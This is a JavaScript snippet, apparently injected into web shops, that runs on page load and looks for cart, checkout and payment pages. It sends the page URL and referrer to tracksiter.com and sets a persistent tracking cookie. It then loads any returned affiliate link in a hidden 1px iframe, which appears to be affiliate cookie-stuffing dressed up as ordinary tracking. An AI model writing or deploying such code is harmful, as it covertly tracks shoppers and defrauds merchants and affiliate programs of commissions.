(function () {
  const CONFIG_URL = '/api/site-configs';
  const TRACK_URL = 'https://tracksiter.com/api/track-user';
  const FALLBACK_PIXEL_URL = 'https://tracksiter.com/api/fallback-pixel?id=';
  const TRACKED_PATH_KEYWORDS = ['cart', 'checkout', 'pay', 'shipping', 'review-order', 'payment'];

  function generateUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
      const r = Math.random() * 16 | 0;
      const v = c === 'x' ? r : (r & 0x3 | 0x8);
      return v.toString(16);
    });
  }

  function getCookie(name) {
    const nameEQ = name + '=';
    const cookies = document.cookie.split(';');
    for (let i = 0; i < cookies.length; i++) {
      const c = cookies[i].trim();
      if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
    }
    return '';
  }

  function isTrackedPath() {
    const path = window.location.pathname.toLowerCase();
    return TRACKED_PATH_KEYWORDS.some(function (keyword) {
      return path.includes(keyword);
    });
  }

  function createTrackingIframe(src) {
    try {
      const iframe = document.createElement('iframe');
      iframe.setAttribute('sandbox', 'allow-same-origin allow-scripts allow-forms');
      iframe.src = src;
      iframe.style.display = 'none';
      iframe.style.visibility = 'hidden';
      iframe.style.width = '1px';
      iframe.style.height = '1px';
      iframe.style.border = '0';
      iframe.onerror = function () {
        const img = new Image();
        img.src = src;
      };
      document.body.appendChild(iframe);
    } catch (err) {
      console.error('Iframe error:', err);
    }
  }

  async function doTrack() {
    if (sessionStorage.getItem('tracking_done_' + window.location.hostname)) {
      if (!isTrackedPath()) return;
    }
    try {
      const uuid = getCookie('tracking_uuid') || generateUUID();
      const expires = new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toUTCString();
      document.cookie = 'tracking_uuid=' + uuid + '; expires=' + expires + ';path=/;SameSite=Lax';

      const res = await fetch(TRACK_URL, {
        method: 'POST',
        keepalive: true,
        body: JSON.stringify({
          url: window.location.href,
          referrer: document.referrer,
          unique_id: uuid,
          origin: window.location.hostname,
          timestamp: new Date().getTime(),
        }),
        headers: { 'Content-Type': 'application/json' },
      });
      const data = await res.json();

      if (data.success && data.affiliate_url) {
        createTrackingIframe(data.affiliate_url);
        sessionStorage.setItem('tracking_done_' + window.location.hostname, 'true');
      } else {
        createTrackingIframe(FALLBACK_PIXEL_URL + uuid);
      }
    } catch (err) {
      console.error('Tracking Failed:', err);
    }
  }

  function fetchConfigAndTrack() {
    const hostname = window.location.hostname;
    fetch(CONFIG_URL)
      .then(function (res) { return res.json(); })
      .then(function (data) {
        const config = data[hostname];
        if (!config) return;
        if (config.always) doTrack();
        config.cartExtra && isTrackedPath() && doTrack();
      })
      .catch(function (err) {
        console.error('Error fetching config:', err);
      });
  }

  if (document.readyState === 'interactive' || document.readyState === 'complete') {
    fetchConfigAndTrack();
  } else {
    window.addEventListener('DOMContentLoaded', fetchConfigAndTrack);
  }
})();
